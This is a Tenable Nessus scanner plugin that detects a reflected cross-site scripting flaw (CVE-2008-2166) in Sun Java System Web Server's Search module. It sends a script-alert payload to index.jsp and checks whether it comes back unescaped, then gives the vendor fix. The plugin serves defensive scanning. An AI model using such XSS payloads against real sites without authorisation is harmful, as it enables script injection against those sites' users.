#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(32136);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-2166");
  script_bugtraq_id(29087);
  script_xref(name:"OSVDB", value:"44850");
  script_xref(name:"Secunia", value:"30133");

  script_name(english:"Sun Java System Web Server Search Module XSS");
  script_summary(english:"Tries to exploit XSS issue in Search webapp");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a JSP application that is affected by a
cross-site scripting vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Sun Java System Web Server, a Java
application for user provisioning and identity auditing in enterprise
environments. 

The version of Sun Java System Web Server installed on the remote host
fails to sanitize user-supplied input to its Search module before
using it to generate dynamic content.  An unauthenticated remote
attacker may be able to leverage this issue to inject arbitrary HTML
or script code into a user's browser to be executed within the
security context of the affected site." );
 script_set_attribute(attribute:"see_also", value:"http://sunsolve.sun.com/search/document.do?assetkey=1-66-231467-1" );
 script_set_attribute(attribute:"solution", value:
"Either edit the default search web application file named 'index.jsp'
which is located at '<WS-install>/lib/webapps/search/index.jsp' to
remove the line containing the text 'out.println(s);' or apply the
appropriate patch as described in the vendor advisory above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Unless we're paranoid, make sure the banner looks like Sun Java System Web Server.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (
    !banner || 
    (
      "Server: Sun-Java-System-Web-Server/" >!< banner &&
      "Server: Sun Java System Web Server" >!< banner
    )
  ) exit(0);
}


# A simple alert.
xss = string("<script>alert(", SCRIPT_NAME, ")</script>");
exploit = string('c=nessus">', xss);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/search", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue.
  req = http_get(item:string(dir, "/index.jsp?", exploit), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if we see our exploit in the output.
  if (string('a href="advanced.jsp?', exploit, '">') >< res)
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
